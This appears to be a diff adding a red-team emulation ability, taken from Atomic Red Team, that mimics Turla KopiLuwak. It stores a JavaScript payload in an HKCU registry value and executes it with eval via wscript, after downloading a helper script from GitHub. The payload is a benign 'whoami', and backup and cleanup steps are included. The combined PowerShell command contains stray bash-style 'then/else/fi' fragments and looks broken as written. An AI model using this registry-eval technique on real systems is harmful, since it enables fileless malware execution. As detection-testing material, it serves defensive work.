@@ -1,0 +1,110 @@
+- id: 9be739ec-b1ba-4950-94d0-e62444b23645
+  name: Turla KopiLuwak Registry JavaScript Payload Execution
+  description: 'Emulates KopiLuwak''s technique of storing a JavaScript payload as
+    REG_BINARY data in the Windows registry
+
+    and executing it. The script uses WMI StdRegProv to read binary data from
+
+    HKCU\Software\Microsoft\Windows\CurrentVersion\Maintenance\MOfficeMaintenance,
+    converts the
+
+    bytes to a string with String.fromCharCode, and runs it with eval(). The registry
+    path, value
+
+    name, and WMI access pattern mirror the real malware.
+
+
+    Reference: https://securelist.com/turla-renews-its-arsenal-with-topinambour/91687/'
+  tactic: execution
+  technique:
+    attack_id: T1059.007
+    name: 'Command and Scripting Interpreter: JavaScript'
+  platforms:
+    windows:
+      psh:
+        command: 'if (Test-Path "PathToAtomicsFolder\T1059.007\src\registry_payload.js")
+          {exit 0} else {exit 1}; then : ; else New-Item -ItemType Directory (Split-Path
+          "PathToAtomicsFolder\T1059.007\src\registry_payload.js") -Force | Out-Null;
+          Invoke-WebRequest "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.007/src/registry_payload.js"
+          -OutFile "PathToAtomicsFolder\T1059.007\src\registry_payload.js"; fi; if
+          (!(Test-Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Maintenance")
+          -or (Test-Path "$env:TEMP\T1059.007_Maintenance.reg")) {exit 0} else {exit
+          1}; then : ; else reg export "HKCU\Software\Microsoft\Windows\CurrentVersion\Maintenance"
+          "$env:TEMP\T1059.007_Maintenance.reg" /y 2>$null; fi; if ((Get-ItemProperty
+          -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Maintenance" -Name
+          "MOfficeMaintenance" -ErrorAction SilentlyContinue).MOfficeMaintenance)
+          {exit 0} else {exit 1}; then : ; else $bytes = [System.Text.Encoding]::ASCII.GetBytes("var
+          shell = new ActiveXObject(''WScript.Shell'');shell.Exec(''cmd.exe /c whoami'');");
+          $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Maintenance";
+          if (!(Test-Path $regPath)) { New-Item -Path $regPath -Force | Out-Null };
+          Set-ItemProperty -Path $regPath -Name "MOfficeMaintenance" -Value $bytes
+          -Type Binary; fi; Start-Process wscript.exe -ArgumentList ''/b'', "PathToAtomicsFolder\T1059.007\src\registry_payload.js"
+          -Wait'
+        cleanup: reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Maintenance"
+          /v MOfficeMaintenance /f 2>$null; $bak = "$env:TEMP\T1059.007_Maintenance.reg";
+          if (Test-Path $bak) { reg import $bak 2>$null; Remove-Item $bak -Force -ErrorAction
+          SilentlyContinue }
+        elevation_required: false
+  plugin: atomic
+  singleton: false
+  repeatable: true
+  delete_payload: false
+  privilege: ''
+  buckets:
+  - t1059.007
+  - atomic-red-team
+  - execution
+  author: Atomic Red Team
+  additional_info:
+    input_arguments:
+      payload:
+        description: JavaScript code to store in the registry as binary and execute
+          via eval
+        type: string
+        default: var shell = new ActiveXObject('WScript.Shell');shell.Exec('cmd.exe
+          /c whoami');
+      registry_script:
+        description: Path to the registry payload JScript file
+        type: path
+        default: PathToAtomicsFolder\T1059.007\src\registry_payload.js
+    dependencies:
+    - description: Registry payload JScript must exist on disk
+      prereq_command: 'if (Test-Path "#{registry_script}") {exit 0} else {exit 1}
+
+        '
+      get_prereq_command: 'New-Item -ItemType Directory (Split-Path "#{registry_script}")
+        -Force | Out-Null
+
+        Invoke-WebRequest "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.007/src/registry_payload.js"
+        -OutFile "#{registry_script}"
+
+        '
+    - description: Backup existing Maintenance registry key if present
+      prereq_command: 'if (!(Test-Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Maintenance")
+        -or (Test-Path "$env:TEMP\T1059.007_Maintenance.reg")) {exit 0} else {exit
+        1}
+
+        '
+      get_prereq_command: 'reg export "HKCU\Software\Microsoft\Windows\CurrentVersion\Maintenance"
+        "$env:TEMP\T1059.007_Maintenance.reg" /y 2>$null
+
+        '
+    - description: Payload must be written to registry as REG_BINARY
+      prereq_command: 'if ((Get-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Maintenance"
+        -Name "MOfficeMaintenance" -ErrorAction SilentlyContinue).MOfficeMaintenance)
+        {exit 0} else {exit 1}
+
+        '
+      get_prereq_command: '$bytes = [System.Text.Encoding]::ASCII.GetBytes("#{payload}")
+
+        $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Maintenance"
+
+        if (!(Test-Path $regPath)) { New-Item -Path $regPath -Force | Out-Null }
+
+        Set-ItemProperty -Path $regPath -Name "MOfficeMaintenance" -Value $bytes -Type
+        Binary
+
+        '
+    technique_created: '2020-06-23T19:12:24.924Z'
+    atomic_guid: 9be739ec-b1ba-4950-94d0-e62444b23645
+    import_timestamp: '2026-09-05T06:41:05.048787Z'
